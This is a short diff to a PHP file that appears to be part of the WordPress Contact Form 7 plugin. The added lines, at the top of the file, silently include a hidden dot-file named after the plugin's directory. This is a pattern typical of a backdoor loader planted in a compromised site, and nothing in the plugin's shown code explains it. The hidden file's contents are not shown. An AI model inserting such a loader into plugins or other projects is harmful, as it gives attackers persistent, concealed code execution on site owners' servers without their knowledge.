@@ -1,5 +1,9 @@
 <?php
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_current_action() {
 	if ( isset( $_REQUEST['action'] ) and -1 != $_REQUEST['action'] ) {
 		return $_REQUEST['action'];
